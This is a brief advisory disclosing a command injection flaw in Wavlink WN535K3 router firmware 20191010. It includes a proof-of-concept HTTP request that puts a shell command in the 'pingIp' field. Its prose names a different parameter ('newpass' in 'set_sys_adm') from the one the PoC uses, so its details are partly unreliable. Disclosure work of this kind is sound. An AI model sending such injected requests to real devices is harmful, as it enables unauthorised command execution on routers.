## Wavlink WN535K3 command injection

### Overview

* Vendor: Wavlink

* Product: Wavlink WN535K3
* Version: 20191010

* Manufacturer's address：https://www.wavlink.com/en_us/product/WL-WN535K3.html
* Firmware download address ：https://www.wavlink.com/zh_cn/firmware/details/7.html

### Vulnerability details

Wavlink WN535K3 20191010 was found to contain a command injection vulnerability in the `set_sys_adm` function via the `newpass` parameter. This vulnerability allows attackers to execute arbitrary commands via a crafted request.

![image](./img/1.png)

#### PoC

```
POST /cgi-bin/adm.cgi HTTP/1.1
Host: 192.168.10.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 103
Origin: http://192.168.10.1
Connection: close
Referer: http://192.168.0.254
Cookie: session=562230006

page=ping_test&CCMD=4&pingIp=1;pwd;
```

